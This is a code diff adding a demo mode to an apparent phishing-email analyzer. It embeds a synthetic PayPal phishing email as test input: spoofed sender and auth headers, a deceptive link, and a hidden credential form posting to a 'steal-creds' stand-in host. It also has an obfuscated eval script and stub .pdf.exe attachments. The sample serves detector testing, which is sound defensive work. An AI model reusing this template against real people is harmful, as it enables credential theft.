@@ -134,6 +134,37 @@ button{font-family:var(--font-mono)}
 .analyze-btn:hover::after{transform:translateX(100%)}
 .analyze-btn:hover{background:#1f6feb;box-shadow:0 0 16px rgba(56,139,253,.35)}
 
+/* Demo button */
+.demo-btn{width:100%;padding:9px 16px;background:linear-gradient(135deg,rgba(188,140,255,.15),rgba(56,139,253,.15));border:1px solid rgba(188,140,255,.4);border-radius:var(--radius);color:var(--accent-purple);font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;font-family:var(--font-mono);letter-spacing:.02em;position:relative;overflow:hidden}
+.demo-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(188,140,255,.12),transparent);transform:translateX(-100%);animation:demo-shimmer 2.4s ease infinite}
+@keyframes demo-shimmer{0%{transform:translateX(-100%)}60%,100%{transform:translateX(100%)}}
+.demo-btn:hover{background:linear-gradient(135deg,rgba(188,140,255,.25),rgba(56,139,253,.2));border-color:var(--accent-purple);box-shadow:0 0 16px rgba(188,140,255,.25)}
+.demo-btn .demo-pulse{width:7px;height:7px;border-radius:50%;background:var(--accent-purple);box-shadow:0 0 0 0 rgba(188,140,255,.6);animation:pulse-ring 1.6s ease-out infinite;flex-shrink:0}
+@keyframes pulse-ring{0%{box-shadow:0 0 0 0 rgba(188,140,255,.6)}70%{box-shadow:0 0 0 7px rgba(188,140,255,0)}100%{box-shadow:0 0 0 0 rgba(188,140,255,0)}}
+
+/* Demo modal */
+.demo-modal-overlay{position:fixed;inset:0;background:rgba(1,4,9,.85);z-index:999;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px);opacity:0;pointer-events:none;transition:opacity .3s}
+.demo-modal-overlay.open{opacity:1;pointer-events:all}
+.demo-modal{background:var(--bg-secondary);border:1px solid rgba(188,140,255,.35);border-radius:12px;width:min(480px,90vw);padding:28px;box-shadow:0 0 60px rgba(188,140,255,.15),var(--shadow);transform:translateY(20px) scale(.97);transition:transform .3s;position:relative;overflow:hidden}
+.demo-modal-overlay.open .demo-modal{transform:translateY(0) scale(1)}
+.demo-modal::before{content:'';position:absolute;top:-60px;right:-60px;width:180px;height:180px;background:radial-gradient(circle,rgba(188,140,255,.18),transparent 70%);pointer-events:none}
+.demo-modal-icon{font-size:42px;text-align:center;margin-bottom:12px;filter:drop-shadow(0 0 12px rgba(188,140,255,.5))}
+.demo-modal h2{font-size:16px;font-weight:700;text-align:center;color:var(--text-primary);margin-bottom:6px}
+.demo-modal .dm-sub{font-size:11px;color:var(--text-secondary);text-align:center;margin-bottom:20px;line-height:1.6}
+.demo-checklist{display:flex;flex-direction:column;gap:7px;margin-bottom:22px;background:var(--bg-tertiary);border-radius:var(--radius);padding:14px}
+.demo-checklist .dc-item{display:flex;align-items:flex-start;gap:10px;font-size:11px;color:var(--text-secondary);line-height:1.5}
+.demo-checklist .dc-icon{font-size:13px;flex-shrink:0;margin-top:1px}
+.demo-checklist .dc-item strong{color:var(--text-primary)}
+.demo-modal-actions{display:flex;gap:8px}
+.demo-modal-actions .btn-run-demo{flex:1;padding:10px;background:linear-gradient(135deg,#6e30c9,#388bfd);border:none;border-radius:var(--radius);color:#fff;font-size:13px;font-weight:700;cursor:pointer;font-family:var(--font-mono);letter-spacing:.03em;transition:opacity .2s;box-shadow:0 4px 16px rgba(110,48,201,.4)}
+.demo-modal-actions .btn-run-demo:hover{opacity:.9}
+.demo-modal-actions .btn-skip{padding:10px 14px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius);color:var(--text-muted);font-size:12px;cursor:pointer;font-family:var(--font-mono);transition:all .15s}
+.demo-modal-actions .btn-skip:hover{color:var(--text-primary);border-color:var(--accent-blue-light)}
+
+/* Typewriter in textarea */
+@keyframes caret-blink{0%,100%{border-right-color:var(--accent-purple)}50%{border-right-color:transparent}}
+.typing-active{border-color:var(--accent-purple)!important;box-shadow:0 0 0 2px rgba(188,140,255,.2)!important}
+
 /* How-to section */
 .howto-section{font-size:11px;line-height:1.9;color:var(--text-secondary)}
 .howto-section .client{color:var(--accent-yellow);font-weight:600;font-size:11px}
@@ -431,6 +462,12 @@ footer .f2{font-size:11px;color:var(--text-muted);margin-top:4px}
       </div>
     </div>
 
+    <!-- Demo button -->
+    <button class="demo-btn" onclick="openDemoModal()" id="demoBtn">
+      <span class="demo-pulse"></span>
+      ✨ Try Demo — See It In Action
+    </button>
+
     <!-- Analyze button -->
     <button class="analyze-btn" onclick="analyze()">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
@@ -586,6 +623,28 @@ footer .f2{font-size:11px;color:var(--text-muted);margin-top:4px}
     <div class="modal-footer">
       <a href="https://ksantos-tech.github.io/ThreatAnalyzer/" target="_blank" class="btn btn-primary">Open ThreatAnalyzer ↗</a>
       <button class="btn" onclick="closeAbout()">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- DEMO MODAL -->
+<div class="demo-modal-overlay" id="demoModalOverlay">
+  <div class="demo-modal">
+    <div class="demo-modal-icon">🎣</div>
+    <h2>See PhishGuard in Action</h2>
+    <p class="dm-sub">Load a pre-built phishing email that triggers <strong>every single detector</strong>.<br>Watch it score a near-perfect threat rating in real time.</p>
+    <div class="demo-checklist">
+      <div class="dc-item"><span class="dc-icon">🔐</span><div><strong>Auth failures</strong> — SPF fail, DKIM fail, DMARC fail, ARC chain broken</div></div>
+      <div class="dc-item"><span class="dc-icon">🎭</span><div><strong>Brand impersonation</strong> — PayPal display name, typosquatted domain</div></div>
+      <div class="dc-item"><span class="dc-icon">↩️</span><div><strong>Reply-To hijack</strong> — replies routed to attacker's inbox</div></div>
+      <div class="dc-item"><span class="dc-icon">🔗</span><div><strong>Deceptive links</strong> — URL text shows PayPal, href goes elsewhere</div></div>
+      <div class="dc-item"><span class="dc-icon">🕵️</span><div><strong>Credential harvesting</strong> — hidden form with password field inside email</div></div>
+      <div class="dc-item"><span class="dc-icon">💣</span><div><strong>Dangerous attachment</strong> — double-extension .pdf.exe payload</div></div>
+      <div class="dc-item"><span class="dc-icon">⚙️</span><div><strong>Obfuscated JS</strong> — eval(), unescape(), fromCharCode() evasion</div></div>
+    </div>
+    <div class="demo-modal-actions">
+      <button class="btn-run-demo" onclick="runDemo()">🚀 Run Demo Analysis</button>
+      <button class="btn-skip" onclick="closeDemoModal()">Skip</button>
     </div>
   </div>
 </div>
@@ -1232,6 +1291,124 @@ function showToast(msg,type='ok'){
   const c=document.getElementById('toastContainer');
   const t=document.createElement('div');t.className=`toast ${type}`;t.innerHTML=`<span>${type==='ok'?'✓':'✕'}</span><span>${msg}</span>`;
   c.appendChild(t);setTimeout(()=>t.remove(),3500)
+}
+
+// ═══════════════════════════════════════════════════════════════
+// DEMO MODE
+// ═══════════════════════════════════════════════════════════════
+const DEMO_EMAIL = `Received: from mail.totally-legit-sender.xyz ([185.220.101.47])
+        by mx.victim-company.com with ESMTP id abc123
+        for <victim@victim-company.com>;
+        Tue, 18 Mar 2025 02:34:11 +0000
+Received: from smtp.bulkmailer.digitalocean.com ([167.99.80.45])
+        by mail.totally-legit-sender.xyz with SMTP
+        id xyz789; Tue, 18 Mar 2025 02:33:58 +0000
+Received-SPF: fail (domain of paypal.com does not designate
+        185.220.101.47 as permitted sender)
+        client-ip=185.220.101.47;
+        envelope-from=bounce@totally-legit-sender.xyz
+Authentication-Results: mx.victim-company.com;
+        spf=fail smtp.mailfrom=totally-legit-sender.xyz;
+        dkim=fail header.i=@paypal.com;
+        dmarc=fail action=none header.from=paypal.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=totally-legit-sender.xyz; s=mail;
+        h=from:to:subject:date:message-id;
+        bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=;
+        b=FakeSignatureValueThatWillFailVerification1234567890abcdef
+ARC-Seal: i=1; cv=fail; a=rsa-sha256; d=totally-legit-sender.xyz; s=arc;
+        b=FakeARCChainFail1234567890
+ARC-Authentication-Results: i=1; mx.victim-company.com;
+        spf=fail; dkim=fail; dmarc=fail
+X-Spam-Status: Yes, score=9.8
+X-Spam-Score: 9.8
+X-Originating-IP: 185.220.101.47
+X-Forwarded-For: 185.220.101.47, 10.0.0.1
+X-Mailer: PhishKit-Pro/3.1 (BulkSender Edition)
+MIME-Version: 1.0
+Date: Tue, 18 Mar 2025 02:34:11 +0000
+From: "PayPal Security" <security@paypa1-secure-login.xyz>
+Reply-To: harvester@evil-collector.ru
+Return-Path: <bounce@totally-legit-sender.xyz>
+To: victim@victim-company.com
+Message-ID: <a8f3k29xmz00qjvbwtlhnyepdrs71@nodomain>
+Subject: Re: [URGENT] Your PayPal account has been suspended — Action Required within 24 hours
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html><html><head></head><body>
+<div style="display:none; font-size:0; opacity:0">Evasion text hidden from view</div>
+<div style="font-family:Arial,sans-serif;max-width:600px;margin:auto">
+<h2>Dear Customer,</h2>
+<p>We have detected <strong>unusual activity</strong> on your PayPal account.
+Your account has been <strong>suspended</strong> due to unauthorized access.
+You must <strong>verify your account</strong> and <strong>confirm your identity</strong>
+to restore access. <strong>Failure to act now</strong> means your account will be
+permanently closed. This offer <strong>expires soon</strong> — do not ignore this
+security alert. Please <strong>reset your password</strong> immediately.</p>
+<a href="https://paypa1-secure-login.xyz/verify?email=victim@victim-company.com&token=abc&login=1">https://www.paypal.com/verify-your-account</a><br><br>
+<a href="https://bit.ly/3xPhishKit">Click here to restore access</a><br><br>
+<a href="http://185.220.101.47/paypal/login.php">Secure Login Portal</a>
+<form action="https://paypa1-secure-login.xyz/steal-creds.php" method="POST">
+<p><strong>Enter your credentials to verify your identity:</strong></p>
+<label>Email: <input type="text" name="email"></label><br>
+<label>Password: <input type="password" name="password"></label><br>
+<button type="submit">Verify &amp; Restore Account</button>
+</form>
+<script>eval(unescape('%61%6c%65%72%74%28%27phish%27%29'));var _x=[String.fromCharCode(104,116,116,112,115)];<\/script>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJgggAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=">
+</div></body></html>
+
+------=_Part_Boundary_001
+Content-Type: application/octet-stream; name="Invoice_PAYMENT_00293.pdf.exe"
+Content-Disposition: attachment; filename="Invoice_PAYMENT_00293.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA
+
+------=_Part_Boundary_001
+Content-Type: application/zip; name="order-confirmation.zip"
+Content-Disposition: attachment; filename="order-confirmation.zip"
+Content-Transfer-Encoding: base64
+
+UEsDBAoAAAAAABNRaFYAAAAAAAAAAAAAAAAJAAAAZG9jdW1lbnQv
+
+------=_Part_Boundary_001--`;
+
+function openDemoModal(){document.getElementById('demoModalOverlay').classList.add('open')}
+function closeDemoModal(){document.getElementById('demoModalOverlay').classList.remove('open')}
+
+function runDemo(){
+  closeDemoModal();
+  // Switch to paste mode
+  const pasteBtn=document.getElementById('modePaste');
+  setMode('paste',pasteBtn);
+  const ta=document.getElementById('emailInput');
+  ta.value='';
+  ta.classList.add('typing-active');
+  ta.placeholder='';
+
+  // Typewriter effect — stream the demo email char by char in fast bursts
+  let i=0;
+  const CHUNK=18; // chars per tick — fast but visible
+  const DELAY=12; // ms between ticks
+
+  showToast('Loading demo phishing email…','ok');
+
+  const typeTimer=setInterval(()=>{
+    const end=Math.min(i+CHUNK,DEMO_EMAIL.length);
+    ta.value=DEMO_EMAIL.slice(0,end);
+    ta.scrollTop=ta.scrollHeight;
+    i=end;
+    if(i>=DEMO_EMAIL.length){
+      clearInterval(typeTimer);
+      ta.classList.remove('typing-active');
+      // Short pause then auto-analyze for the "wow" moment
+      setTimeout(()=>{
+        showToast('Running full analysis…','ok');
+        setTimeout(()=>analyze(),400);
+      },500);
+    }
+  },DELAY);
 }
 
 // Drag & drop
